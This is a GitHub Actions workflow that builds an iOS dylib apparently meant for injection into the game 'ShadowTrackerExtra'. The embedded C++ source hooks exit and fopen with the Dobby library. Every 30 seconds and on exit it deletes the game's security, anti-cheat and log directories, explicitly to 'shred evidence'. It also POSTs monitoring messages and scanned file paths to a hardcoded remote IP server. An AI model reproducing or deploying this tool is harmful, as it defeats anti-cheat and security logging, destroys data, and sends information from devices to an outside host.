name: Imperial Shadow Shutdown-Guard V15.1

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_shadow_engine:
    runs-on: macos-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Dobby Framework
        run: |
          # تحميل مكتبة Dobby لعمل الهوكات الاحترافية
          curl -L https://github.com/jmpews/Dobby/releases/download/v1.1.2/dobby_arm64-apple-darwin.tar.gz | tar -xz
          mv dobby_arm64-apple-darwin/libdobby.a .
          mv dobby_arm64-apple-darwin/dobby.h .

      - name: Smelt Imperial C++ Code
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #include <iostream>
          #include <thread>
          #include <chrono>
          #include <dlfcn.h>
          #include <mach-o/dyld.h>
          #include <sys/mman.h>
          #include "dobby.h"

          using namespace std;

          // --- [ إعدادات السيرفر ] ---
          void RemoteLog(NSString *msg) {
              NSString *url = @"http://34.204.178.160:5000/log";
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"content": msg} options:0 error:nil];
              [req setHTTPBody:data];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          // --- [ مفرمة الملفات ] ---
          void WipeSecurityData() {
              NSString *docDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
              NSArray *trash = @[@"/GCloud", @"/Logs", @"/Caches", @"/.system_logs", @"/ano_tmp"];
              for (NSString *p in trash) {
                  [[NSFileManager defaultManager] removeItemAtPath:[docDir stringByAppendingString:p] error:nil];
              }
          }

          // --- [ هوك دالة الخروج ] ---
          void (*orig_exit)(int);
          void my_exit(int code) {
              RemoteLog(@"[⚠️] SHUTDOWN DETECTED! Shredding evidence before exit...");
              WipeSecurityData();
              // نعطي السيرفر وقت يستلم التقرير قبل ما تموت اللعبة
              this_thread::sleep_for(chrono::seconds(2));
              orig_exit(code);
          }

          // --- [ هوك مراقبة الملفات ] ---
          FILE* (*orig_fopen)(const char*, const char*);
          FILE* my_fopen(const char* path, const char* mode) {
              if (path && (strstr(path, "/var/mobile/") || strstr(path, "ShadowTrackerExtra"))) {
                  RemoteLog([NSString stringWithFormat:@"[🔍] SCAN: %s", path]);
              }
              return orig_fopen(path, mode);
          }

          void InitializeImperial() {
              // 1. هوك الخروج (للمراقبة بعد الإغلاق)
              void *exit_ptr = dlsym(RTLD_DEFAULT, "exit");
              DobbyHook(exit_ptr, (void *)my_exit, (void **)&orig_exit);

              // 2. هوك مراقبة الملفات (الرادار)
              void *fopen_ptr = dlsym(RTLD_DEFAULT, "fopen");
              DobbyHook(fopen_ptr, (void *)my_fopen, (void **)&orig_fopen);

              RemoteLog(@"[🐲] Imperial V15.1 FULL MONITORING ACTIVE.");
          }

          __attribute__((constructor))
          static void entry() {
              thread([]() {
                  this_thread::sleep_for(chrono::seconds(10));
                  InitializeImperial();
                  while(true) {
                      this_thread::sleep_for(chrono::seconds(30));
                      WipeSecurityData();
                  }
              }).detach();
          }
          EOF

      - name: Compile Imperial Stealth Module
        run: |
          clang++ -dynamiclib -std=c++11 \
          -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 \
          -I. -L. -ldobby \
          jni/main.mm -o ShadowImperial.dylib \
          -framework Foundation -lobjc

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Imperial-AntiShutdown-V15.1
          path: ShadowImperial.dylib
          
